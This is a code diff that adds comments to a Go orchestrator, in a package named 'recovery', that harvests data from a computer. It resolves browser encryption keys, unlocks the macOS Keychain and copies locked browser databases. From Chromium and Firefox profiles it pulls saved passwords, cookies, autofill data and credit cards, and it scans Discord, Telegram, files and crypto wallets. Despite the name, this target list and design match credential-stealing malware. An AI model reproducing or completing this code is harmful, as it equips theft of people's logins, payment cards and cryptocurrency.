@@ -1,3 +1,13 @@
+// collect.go — concurrent harvest orchestration.
+//
+// Collect:
+//  1. Platform setup (darwin: ensure Keychain session is usable).
+//  2. For each installed browser: resolve encryption keys + list profiles.
+//  3. Fan out non-browser scanners (Discord, files, wallets, telegram, …) as goroutines.
+//  4. Worker pool extracts per-profile Chromium/Firefox data (passwords, cookies, …).
+//  5. Merge partial results under a mutex; optional partialFn for streaming UI (unused by CLI).
+//
+// extractProfileData runs category extractors in parallel within a single profile.
 package recovery
 
 import (
@@ -14,6 +24,7 @@ import (
 	"recovery/recovery/types"
 )
 
+// mergeInto appends all slices from src into dst (and copies gaming/VPN pointers).
 func mergeInto(dst, src *types.CollectionResult) {
 	dst.Passwords = append(dst.Passwords, src.Passwords...)
 	dst.PasswordCandidates = append(dst.PasswordCandidates, src.PasswordCandidates...)
@@ -37,9 +48,12 @@ func mergeInto(dst, src *types.CollectionResult) {
 	dst.Errors = append(dst.Errors, src.Errors...)
 }
 
+// Collect runs the full harvest according to opts.
+// partialFn, if non-nil, is invoked when a subcategory yields new data (for progressive UIs).
 func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult)) (*types.CollectionResult, error) {
 	result := &types.CollectionResult{}
 
+	// Clear any process/handle cache between runs (mac stubs are no-ops).
 	platform.ResetHandleCache()
 	defer platform.ResetHandleCache()
 
@@ -49,11 +63,12 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 	needsBrowserData := opts.Passwords || opts.Cookies || opts.Autofill ||
 		opts.History || opts.Bookmarks || opts.CreditCards
 
+	// Per-browser key material is resolved once and shared across that browser's profiles.
 	type browserState struct {
 		cfg      types.BrowserConfig
 		keys     *types.ResolvedKeys
 		profiles []types.ProfileInfo
-		pids     []uint32
+		pids     []uint32 // running PIDs — used when copying locked SQLite DBs
 	}
 
 	var states []browserState
@@ -66,6 +81,7 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 			logf("resolving keys for %s (%d profiles)", cfg.Name, len(profiles))
 			keys, err := crypto.ResolveKeys(cfg)
 			if err != nil {
+				// Continue without keys: plaintext cookies/history may still extract.
 				result.Errors = append(result.Errors, fmt.Sprintf("%s key resolution: %v", cfg.Name, err))
 				logf("%s key resolution failed: %v", cfg.Name, err)
 				keys = &types.ResolvedKeys{}
@@ -216,6 +232,7 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 		}()
 	}
 
+	// Bound browser-profile extraction concurrency (SQLite + decryption is I/O heavy).
 	const workers = 4
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
@@ -246,6 +263,8 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 	return result, nil
 }
 
+// extractProfileData pulls enabled categories from one browser profile.
+// Firefox and Chromium use different backends; credit cards are Chromium-only here.
 func extractProfileData(cfg types.BrowserConfig, keys *types.ResolvedKeys, profile types.ProfileInfo, pids []uint32, opts types.CollectOptions) *types.CollectionResult {
 	partial := &types.CollectionResult{}
 	var wg sync.WaitGroup
